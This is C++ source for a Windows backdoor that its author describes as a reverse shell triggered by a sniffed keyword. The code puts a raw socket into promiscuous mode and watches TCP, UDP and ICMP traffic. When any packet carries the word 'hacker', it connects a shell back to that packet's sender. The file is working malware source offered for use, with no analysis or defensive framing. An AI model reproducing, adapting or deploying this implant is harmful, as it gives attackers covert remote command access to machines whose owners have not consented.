/*
	DiabloHorn
	revers shell based on sniffed keyword
*/
#include "Sniffer.h"
#include "Shell.h"

#define MAX_HOSTNAME_LAN 255
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

//thx to n0limit for letting me borrow some code
//and also for him answering my yet again retarded questions.

Sniffer::Sniffer()
{

}

Sniffer::~Sniffer()
{
}

int Sniffer::GetRevShell()
{
	SOCKET sock;
	WSADATA wsd;
	SOCKADDR_IN sa;
	unsigned int optval = 1;
	int retLen;
	DWORD dwBytesRet;
	char RecvBuf[65535] = {0};
	

	WSAStartup(MAKEWORD(2,1),&wsd);
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	if(sock == INVALID_SOCKET)
	{
		return -1;
	}

	sa.sin_family = AF_INET;
	sa.sin_port = htons(0);
	sa.sin_addr.s_addr  =  htonl (INADDR_ANY);

	char name[MAX_HOSTNAME_LAN];
	gethostname(name, MAX_HOSTNAME_LAN);
	struct hostent * pHostent;
	pHostent = (struct hostent * )malloc(sizeof(struct hostent));
	pHostent = gethostbyname(name);
	memcpy(&sa.sin_addr.S_un.S_addr, pHostent->h_addr_list[0], pHostent->h_length);

	if((bind(sock, (SOCKADDR *)&sa, sizeof(sa)))==SOCKET_ERROR)
	{
		return -1;
	}

	if(WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL) != 0)
	{
		printf("Error: %d",WSAGetLastError());
		return -1;
	}	

	PACKET_TCP pTcp;
	PACKET_UDP pUdp;
	PACKET_ICMP pIcmp;
	Shell rShell;

	while(1)
	{
		memset(RecvBuf, '\0', sizeof(RecvBuf));
		retLen = recv(sock, RecvBuf, sizeof(RecvBuf), 0);
		
		IP_HDR *ip = (IP_HDR *)((char *)RecvBuf); //used to check which proto is entering the building

		if(IPPROTO_TCP == ip->proto)
		{
			char buffer[256];
			SOCKADDR_IN saSrc;
			pTcp.ipHdr = (IP_HDR *)(RecvBuf);
			pTcp.tcpHdr = (TCP_HDR *)(RecvBuf+(sizeof(IP_HDR)));
			pTcp.data = (unsigned char *) (RecvBuf + sizeof(IP_HDR) + sizeof(TCP_HDR));
			pTcp.dataLen = (retLen - (sizeof(IP_HDR) + sizeof(TCP_HDR)));

			if(findStr((const char *)pTcp.data,"hacker"))
			{
				saSrc.sin_addr.s_addr = pTcp.ipHdr->sourceIP;
				strcpy_s(buffer,inet_ntoa(saSrc.sin_addr));
				printf("works %s %i\n",buffer,ntohs(pTcp.tcpHdr->dport));
				rShell.ReverseShell(ntohs(pTcp.tcpHdr->dport),buffer); //launch shell
				
			}
		}
		else if(IPPROTO_UDP == ip->proto)
		{
			char buffer[256];
			SOCKADDR_IN saSrc;
			pUdp.ipHdr = (IP_HDR *)(RecvBuf);
			pUdp.udpHdr = (UDP_HDR *)(RecvBuf+(sizeof(IP_HDR)));
			pUdp.data = (unsigned char *) (RecvBuf + sizeof(IP_HDR) + sizeof(UDP_HDR));
			pUdp.dataLen = (retLen - (sizeof(IP_HDR) + sizeof(UDP_HDR)));

			if(findStr((const char *)pUdp.data,"hacker"))
			{
				saSrc.sin_addr.s_addr = pUdp.ipHdr->sourceIP;
				strcpy_s(buffer,inet_ntoa(saSrc.sin_addr));
				printf("works %s %i\n",buffer,pUdp.udpHdr->dport);
				rShell.ReverseShell(ntohs(pUdp.udpHdr->dport),buffer); //launch shell

			}
		}
		else if(IPPROTO_ICMP == ip->proto)
		{
			char buffer[256];
			SOCKADDR_IN saSrc;
			pIcmp.ipHdr = (IP_HDR *)(RecvBuf);
			pIcmp.icmpHdr = (ICMP_HDR *)(RecvBuf+(sizeof(IP_HDR)));
			pIcmp.data = (unsigned char *) (RecvBuf + sizeof(IP_HDR) + sizeof(ICMP_HDR));
			pIcmp.dataLen = (retLen - (sizeof(IP_HDR) + sizeof(ICMP_HDR)));

			if(findStr((const char *)pIcmp.data,"hacker"))
			{
				saSrc.sin_addr.s_addr = pIcmp.ipHdr->sourceIP;
				strcpy_s(buffer,inet_ntoa(saSrc.sin_addr));
				printf("works %s %i\n",buffer,50); //change this as you want.
				rShell.ReverseShell(50,buffer); //launch shell

			}
		}
		else
		{
			//elvis leaves building cause of no knowledge
		}

	}
	
	return 0;
}

/*thx to BackBon3 spared me the fiddling around*/

//you can change this function to get the connect back port when using icmp
//to launch the shell.
BOOLEAN Sniffer::findStr(const char *psz,const char *tofind)
{
	const char *ptr = psz;
	const char *ptr2;

    while(1)
	{
		ptr = strchr(psz,toupper(*tofind));
		ptr2 = strchr(psz,tolower(*tofind));
		if (!ptr)
		{
			ptr = ptr2; /* was ptr2 = ptr.  Big bug fixed 10/22/99 */
		}
		if (!ptr)
		{
			break;
		}

		if (ptr2 && (ptr2 < ptr))
		{
			ptr = ptr2;
		}

		if (!_strnicmp(ptr,tofind,strlen(tofind)))
		{
			return TRUE;
		}

		psz = ptr+1;
	}

return FALSE;
} /* stristr */